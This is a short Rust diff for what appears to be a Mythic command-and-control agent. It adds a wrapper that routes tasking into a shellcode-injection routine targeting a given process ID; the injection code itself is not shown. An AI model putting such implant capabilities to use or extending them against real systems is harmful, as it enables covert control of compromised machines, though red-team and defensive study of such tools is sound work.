@@ -1,5 +1,6 @@
 use serde::{Deserialize, Serialize};
 use std::fs;
+use crate::{AgentTask, mythic_success, mythic_error};
 
 #[cfg(target_os = "windows")]
 use std::mem;
@@ -27,6 +28,15 @@ use winapi::um::winbase::WAIT_OBJECT_0;
 pub struct ShinjectArgs {
     pub shellcode: String,  // File ID from Mythic
     pub process_id: u32,
+}
+
+/// Wrapper function for compatibility with the tasking system
+pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;
+    match execute_shinject(args) {
+        Ok(output) => Ok(mythic_success!(task.id, output)),
+        Err(error) => Ok(mythic_error!(task.id, error)),
+    }
 }
 
 #[cfg(target_os = "windows")]
